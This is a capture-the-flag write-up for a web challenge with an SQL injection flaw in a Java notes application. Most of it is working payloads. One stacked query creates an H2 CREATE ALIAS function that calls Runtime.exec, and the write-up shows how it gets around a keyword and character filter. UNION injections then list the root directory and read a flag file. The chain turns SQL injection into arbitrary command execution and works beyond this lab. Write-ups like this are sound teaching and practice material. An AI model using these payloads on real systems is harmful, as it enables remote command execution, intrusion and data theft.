# Challenge: Pentest Notes
## Rate: Easy

The vulnerable code in the web application processes the `name` parameter by using the `String.format()` method to build a SQL query:

```java
String query = String.format("Select * from notes where name ='%s' ", name);
```

This allows an attacker to inject arbitrary SQL, potentially altering the query logic to execute additional commands. The application also contains restrictions on characters like `$` and strings like `concat`, but these restrictions can be bypassed.

### Exploiting the Vulnerability:

1. **Bypassing Restrictions**:
    - The vulnerability in the `name` parameter allows attackers to inject SQL statements.
    - We exploit this by terminating the current query with a semicolon (`';`) and injecting a `CREATE ALIAS` statement that defines a custom function to execute system commands.
    - The `CREATE ALIAS` statement avoids the use of restricted characters like `$` and `concat`.
2. **Payload to Create Alias**:
The first part of the attack creates a custom Java alias that runs system commands using `Runtime.getRuntime().exec()`. This alias, named `REVEXEC`, executes any command passed to it.
    
    **Payload**:
    
    ```sql
    '; CREATE ALIAS REVEXEC AS 'String shellexec(String cmd) throws java.io.IOException {java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";}';--
    ```
    
    This payload successfully creates an alias `REVEXEC` that can execute system commands, such as listing directory contents or reading files.
    

Once the `REVEXEC` alias is created, we can execute arbitrary commands by calling the `shellexec` function with different arguments.

1. **Listing System Directories**:
To list directories on the system, we inject the following payload:
    
    ```sql
    pwn' UNION SELECT 1, 2, REVEXEC('ls /') --
    ```
    
    - `REVEXEC` is the name of the function we use to execute commands, and `ls /` lists the contents of the root directory.
2. **Reading a Flag File**:
To retrieve the contents of the flag file, we use:
    
    ```sql
    pwn' UNION SELECT 1, 2, REVEXEC('cat /randomChar_flag.txt') --
    ```
